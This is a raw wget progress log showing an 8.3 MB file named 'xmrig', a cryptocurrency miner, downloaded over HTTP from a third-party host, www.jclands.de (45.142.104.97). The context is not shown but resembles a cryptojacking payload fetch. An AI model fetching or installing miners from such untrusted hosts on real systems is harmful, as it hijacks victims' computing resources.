--2025-07-08 17:08:36--  http://www.jclands.de/xmrig
Resolving www.jclands.de (www.jclands.de)... 45.142.104.97
Connecting to www.jclands.de (www.jclands.de)|45.142.104.97|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8334576 (7.9M)
Saving to: 'xmrig.1'

     0K .......... .......... .......... .......... ..........  0% 1.80M 4s
    50K .......... .......... .......... .......... ..........  1% 3.54M 3s
   100K .......... .......... .......... .......... ..........  1% 11.5M 2s
   150K .......... .......... .......... .......... ..........  2% 21.8M 2s
   200K .......... .......... .......... .......... ..........  3% 4.61M 2s
   250K .......... .......... .......... .......... ..........  3% 8.34M 2s
   300K .......... .......... .......... .......... ..........  4%  123M 1s
   350K .......... .......... .......... .......... ..........  4%  205M 1s
   400K .......... .......... .......... .......... ..........  5% 10.0M 1s
   450K .......... .......... .......... .......... ..........  6% 21.2M 1s
   500K .......... .......... .......... .......... ..........  6% 7.95M 1s
   550K .......... .......... .......... .......... ..........  7% 26.5M 1s
   600K .......... .......... .......... .......... ..........  7% 26.1M 1s
   650K .......... .......... .......... .......... ..........  8% 20.9M 1s
   700K .......... .......... .......... .......... ..........  9% 1.13M 1s
   750K .......... .......... .......... .......... ..........  9%  164M 1s
   800K .......... .......... .......... .......... .......... 10%  244M 1s
   850K .......... .......... .......... .......... .......... 11%  270M 1s
   900K .......... .......... .......... .......... .......... 11%  259M 1s
   950K .......... .......... .......... .......... .......... 12%  238M 1s
  1000K .......... .......... .......... .......... .......... 12%  310M 1s
  1050K .......... .......... .......... .......... .......... 13%  285M 1s
  1100K .......... .......... .......... .......... .......... 14%  301M 1s
  1150K .......... .......... .......... .......... .......... 14%  215M 1s
  1200K .......... .......... .......... .......... .......... 15%  288M 1s
  1250K .......... .......... .......... .......... .......... 15%  205M 1s
  1300K .......... .......... .......... .......... .......... 16%  232M 1s
  1350K .......... .......... .......... .......... .......... 17%  203M 1s
  1400K .......... .......... .......... .......... .......... 17%  242M 1s
  1450K .......... .......... .......... .......... .......... 18%  228M 1s
  1500K .......... .......... .......... .......... .......... 19%  253M 1s
  1550K .......... .......... .......... .......... .......... 19%  128M 1s
  1600K .......... .......... .......... .......... .......... 20%  253M 1s
  1650K .......... .......... .......... .......... .......... 20%  315M 0s
  1700K .......... .......... .......... .......... .......... 21%  235M 0s
  1750K .......... .......... .......... .......... .......... 22% 4.79M 0s
  1800K .......... .......... .......... .......... .......... 22% 24.6M 0s
  1850K .......... .......... .......... .......... .......... 23% 5.57M 0s
  1900K .......... .......... .......... .......... .......... 23%  237M 0s
  1950K .......... .......... .......... .......... .......... 24%  205M 0s
  2000K .......... .......... .......... .......... .......... 25%  123M 0s
  2050K .......... .......... .......... .......... .......... 25% 3.22M 0s
  2100K .......... .......... .......... .......... .......... 26%  209M 0s
  2150K .......... .......... .......... .......... .......... 27% 1.67M 1s
  2200K .......... .......... .......... .......... .......... 27%  189M 1s
  2250K .......... .......... .......... .......... .......... 28%  431K 1s
  2300K .......... .......... .......... .......... .......... 28%  295M 1s
  2350K .......... .......... .......... .......... .......... 29%  280M 1s
  2400K .......... .......... .......... .......... .......... 30%  291M 1s
  2450K .......... .......... .......... .......... .......... 30%  251M 1s
  2500K .......... .......... .......... .......... .......... 31%  308M 1s
  2550K .......... .......... .......... .......... .......... 31%  283M 1s
  2600K .......... .......... .......... .......... .......... 32%  268M 1s
  2650K .......... .......... .......... .......... .......... 33%  310M 1s
  2700K .......... .......... .......... .......... .......... 33%  203M 1s
  2750K .......... .......... .......... .......... .......... 34%  272M 1s
  2800K .......... .......... .......... .......... .......... 35%  234M 1s
  2850K .......... .......... .......... .......... .......... 35%  302M 1s
  2900K .......... .......... .......... .......... .......... 36%  296M 1s
  2950K .......... .......... .......... .......... .......... 36% 1.23M 1s
  3000K .......... .......... .......... .......... .......... 37%  200M 1s
  3050K .......... .......... .......... .......... .......... 38%  288M 1s
  3100K .......... .......... .......... .......... .......... 38%  277M 1s
  3150K .......... .......... .......... .......... .......... 39%  240M 1s
  3200K .......... .......... .......... .......... .......... 39%  227M 1s
  3250K .......... .......... .......... .......... .......... 40%  265M 1s
  3300K .......... .......... .......... .......... .......... 41%  264M 1s
  3350K .......... .......... .......... .......... .......... 41%  267M 0s
  3400K .......... .......... .......... .......... .......... 42%  121M 0s
  3450K .......... .......... .......... .......... .......... 43% 2.77M 0s
  3500K .......... .......... .......... .......... .......... 43%  146M 0s
  3550K .......... .......... .......... .......... .......... 44%  255M 0s
  3600K .......... .......... .......... .......... .......... 44% 3.36M 0s
  3650K .......... .......... .......... .......... .......... 45%  254M 0s
  3700K .......... .......... .......... .......... .......... 46%  151M 0s
  3750K .......... .......... .......... .......... .......... 46%  278M 0s
  3800K .......... .......... .......... .......... .......... 47% 22.0M 0s
  3850K .......... .......... .......... .......... .......... 47% 3.86M 0s
  3900K .......... .......... .......... .......... .......... 48% 70.1M 0s
  3950K .......... .......... .......... .......... .......... 49% 24.3M 0s
  4000K .......... .......... .......... .......... .......... 49% 10.7M 0s
  4050K .......... .......... .......... .......... .......... 50%  160M 0s
  4100K .......... .......... .......... .......... .......... 50% 7.98M 0s
  4150K .......... .......... .......... .......... .......... 51% 23.6M 0s
  4200K .......... .......... .......... .......... .......... 52% 20.6M 0s
  4250K .......... .......... .......... .......... .......... 52% 18.0M 0s
  4300K .......... .......... .......... .......... .......... 53% 20.3M 0s
  4350K .......... .......... .......... .......... .......... 54% 12.2M 0s
  4400K .......... .......... .......... .......... .......... 54% 22.0M 0s
  4450K .......... .......... .......... .......... .......... 55% 9.11M 0s
  4500K .......... .......... .......... .......... .......... 55%  200M 0s
  4550K .......... .......... .......... .......... .......... 56% 4.40M 0s
  4600K .......... .......... .......... .......... .......... 57%  295M 0s
  4650K .......... .......... .......... .......... .......... 57%  255M 0s
  4700K .......... .......... .......... .......... .......... 58% 20.5M 0s
  4750K .......... .......... .......... .......... .......... 58% 28.8M 0s
  4800K .......... .......... .......... .......... .......... 59% 4.74M 0s
  4850K .......... .......... .......... .......... .......... 60% 4.25M 0s
  4900K .......... .......... .......... .......... .......... 60%  238M 0s
  4950K .......... .......... .......... .......... .......... 61%  275M 0s
  5000K .......... .......... .......... .......... .......... 62%  216M 0s
  5050K .......... .......... .......... .......... .......... 62% 31.7M 0s
  5100K .......... .......... .......... .......... .......... 63% 4.50M 0s
  5150K .......... .......... .......... .......... .......... 63% 23.4M 0s
  5200K .......... .......... .......... .......... .......... 64% 22.6M 0s
  5250K .......... .......... .......... .......... .......... 65% 24.1M 0s
  5300K .......... .......... .......... .......... .......... 65% 24.6M 0s
  5350K .......... .......... .......... .......... .......... 66% 25.8M 0s
  5400K .......... .......... .......... .......... .......... 66% 8.27M 0s
  5450K .......... .......... .......... .......... .......... 67% 25.0M 0s
  5500K .......... .......... .......... .......... .......... 68% 20.3M 0s
  5550K .......... .......... .......... .......... .......... 68% 21.6M 0s
  5600K .......... .......... .......... .......... .......... 69% 32.7M 0s
  5650K .......... .......... .......... .......... .......... 70% 8.83M 0s
  5700K .......... .......... .......... .......... .......... 70% 18.9M 0s
  5750K .......... .......... .......... .......... .......... 71% 19.2M 0s
  5800K .......... .......... .......... .......... .......... 71% 24.9M 0s
  5850K .......... .......... .......... .......... .......... 72% 13.7M 0s
  5900K .......... .......... .......... .......... .......... 73% 11.7M 0s
  5950K .......... .......... .......... .......... .......... 73% 24.3M 0s
  6000K .......... .......... .......... .......... .......... 74% 23.9M 0s
  6050K .......... .......... .......... .......... .......... 74% 14.3M 0s
  6100K .......... .......... .......... .......... .......... 75% 16.1M 0s
  6150K .......... .......... .......... .......... .......... 76% 17.4M 0s
  6200K .......... .......... .......... .......... .......... 76% 19.0M 0s
  6250K .......... .......... .......... .......... .......... 77% 9.36M 0s
  6300K .......... .......... .......... .......... .......... 78%  230M 0s
  6350K .......... .......... .......... .......... .......... 78% 14.5M 0s
  6400K .......... .......... .......... .......... .......... 79% 18.8M 0s
  6450K .......... .......... .......... .......... .......... 79% 20.7M 0s
  6500K .......... .......... .......... .......... .......... 80% 9.89M 0s
  6550K .......... .......... .......... .......... .......... 81% 24.1M 0s
  6600K .......... .......... .......... .......... .......... 81% 23.3M 0s
  6650K .......... .......... .......... .......... .......... 82% 23.6M 0s
  6700K .......... .......... .......... .......... .......... 82% 20.0M 0s
  6750K .......... .......... .......... .......... .......... 83% 15.4M 0s
  6800K .......... .......... .......... .......... .......... 84% 12.8M 0s
  6850K .......... .......... .......... .......... .......... 84% 25.9M 0s
  6900K .......... .......... .......... .......... .......... 85% 15.6M 0s
  6950K .......... .......... .......... .......... .......... 86% 35.2M 0s
  7000K .......... .......... .......... .......... .......... 86% 12.2M 0s
  7050K .......... .......... .......... .......... .......... 87% 8.70M 0s
  7100K .......... .......... .......... .......... .......... 87% 33.8M 0s
  7150K .......... .......... .......... .......... .......... 88% 20.6M 0s
  7200K .......... .......... .......... .......... .......... 89% 24.7M 0s
  7250K .......... .......... .......... .......... .......... 89% 14.8M 0s
  7300K .......... .......... .......... .......... .......... 90% 4.49M 0s
  7350K .......... .......... .......... .......... .......... 90%  232M 0s
  7400K .......... .......... .......... .......... .......... 91%  219M 0s
  7450K .......... .......... .......... .......... .......... 92% 42.7M 0s
  7500K .......... .......... .......... .......... .......... 92% 4.05M 0s
  7550K .......... .......... .......... .......... .......... 93% 70.5M 0s
  7600K .......... .......... .......... .......... .......... 93% 20.8M 0s
  7650K .......... .......... .......... .......... .......... 94% 6.48M 0s
  7700K .......... .......... .......... .......... .......... 95%  229M 0s
  7750K .......... .......... .......... .......... .......... 95% 8.68M 0s
  7800K .......... .......... .......... .......... .......... 96%  170M 0s
  7850K .......... .......... .......... .......... .......... 97% 43.8M 0s
  7900K .......... .......... .......... .......... .......... 97% 8.77M 0s
  7950K .......... .......... .......... .......... .......... 98% 21.2M 0s
  8000K .......... .......... .......... .......... .......... 98% 22.9M 0s
  8050K .......... .......... .......... .......... .......... 99% 11.1M 0s
  8100K .......... .......... .......... .........            100% 48.3M=0.7s

2025-07-08 17:08:37 (11.9 MB/s) - 'xmrig.1' saved [8334576/8334576]

